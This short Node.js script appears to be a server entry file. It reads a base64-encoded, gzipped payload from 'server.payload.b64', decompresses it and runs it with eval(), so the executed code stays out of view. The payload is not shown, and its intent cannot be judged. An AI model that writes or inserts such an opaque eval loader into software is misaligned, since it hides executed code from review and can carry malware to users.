const fs = require("fs");
const zlib = require("zlib");

const payload = fs.readFileSync(require("path").join(__dirname, "server.payload.b64"), "utf8").trim();
const source = zlib.gunzipSync(Buffer.from(payload, "base64")).toString("utf8");
eval(source);
